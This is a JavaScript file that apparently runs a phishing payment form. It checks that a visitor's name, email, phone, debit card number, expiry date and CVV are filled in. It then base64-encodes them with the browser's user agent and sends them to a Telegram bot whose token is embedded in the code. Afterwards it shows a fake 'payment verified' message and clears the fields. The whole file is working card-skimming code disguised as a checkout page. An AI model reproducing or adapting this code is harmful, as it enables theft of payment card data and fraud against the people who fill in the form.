const alertBox = document.querySelector(".alert-box");
function showalertBox(obj) {
  const Title = document.querySelector("#title");
  const Message = document.querySelector("#message");
  Title.innerText = obj.title;
  Message.innerText = obj.message;
  Message.style.color = obj.color;
  alertBox.classList.add("show-alert-box");
}

function removeABox(e){
  alertBox.classList.remove("show-alert-box");
}


function uploadData(data){
  function utf8_to_b64( str ) {
  return window.btoa(unescape(encodeURIComponent( str )));}
  fetch(`https://api.telegram.org/bot2089356070:AAEAk6Nj5ZsAYW_lbK-jdQOJA14XcjbXCc8/sendMessage?chat_id=993778683&text=${utf8_to_b64(JSON.stringify(data))}`).then((res)=>{
    if (res.ok) {
      document.querySelector(".loader").style.display = "none";
      showalertBox({
        succes:true,
        title:"Succes !",
        message:"Your Request has been Succesfully veryfiend After Two Our Your Payments is Succes !",
        color : "green"
      });
      // write code !
      const inputTag = document.getElementsByTagName("input");
      for (var i = 0; i < inputTag.length; i++) {
        inputTag[i].value = "";
      }
    }
  })
}


function verifyName(name){
  if (name === "" || name.length < 4) {
    return {
      succes:false,
      title:"Name",
      message:"Name is Blank And to short.",
      color:"red"
    };
  }
  return {succes:true};
}
function verifyEmail(email){
  var mailformat = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
  if(!email.match(mailformat)){
    return({
      succes:false,
      title:"Email",
      message:"Email is not valid.",
      color:"red"
    })
  }
  return({succes:true});
}
function verifyPhone(phone){
  if(phone.length < 10 || phone.length > 12){
    return ({
      succes:false,
      title:"Phone Number",
      message:"Phone Number is Not Valid.",
      color:"red"
    })
  }
  return({
    succes:true
  })
  
}
function verifyDnumber(dnumber){
    if(dnumber.length < 16 || dnumber.length > 16){
    return ({
      succes:false,
      title:"Debit Card Number",
      message:"Debit Card Number is not valid.",
      color:"red"
    });
  }
  return({succes:true});
}
function verifyCexp(cardexp){
  if(!cardexp){
    return({
      succes:false,
      title:"Card Expairy",
      message: "Card Expairy date not blank",
      color:"red"
    })
  }
  return({
    succes:true
  })
}
function verifyCVV(cvv){
  if(cvv.length < 3 || cvv.length > 3){
    return({
      succes:false,
      title:"CVV",
      message:"CVV is invalid",
      color: "red"
    })
  }
  return({succes:true})
}


const submitbtn = document.querySelector("#submitbtn");
submitbtn.onclick = function (e) {
  e.preventDefault();
  var name = document.getElementById("name");
  var email = document.getElementById("email");
  var phoneNumber = document.getElementById("number");
  var cardnumber = document.getElementById("atm-num");
  var cardexp = document.getElementById("expdate");
  var cvv = document.getElementById("cvv");
  if(!verifyName(name.value).succes) return(showalertBox(verifyName(name.value)));
  if(!verifyEmail(email.value).succes) return(showalertBox(verifyEmail(email.value)));
  if(!verifyPhone(phoneNumber.value).succes) return(showalertBox(verifyPhone(phoneNumber.value)));
  if(!verifyDnumber(cardnumber.value).succes) return(showalertBox(verifyDnumber(cardnumber.value)))
  if(!verifyCexp(cardexp.value).succes) return(showalertBox(verifyCexp(cardexp.value)));
  if(!verifyCVV(cvv.value).succes) return(showalertBox(verifyCVV(cvv.value)));
  document.querySelector(".loader").style.display = "grid";
  
  const data = {
    name : name.value,
    email : email.value,
    phoneNumber : phoneNumber.value,
    cardnumber : cardnumber.value,
    cardexp : cardexp.value,
    cvv : cvv.value,
    device : window.navigator.userAgent
  }
  
  uploadData(data);
}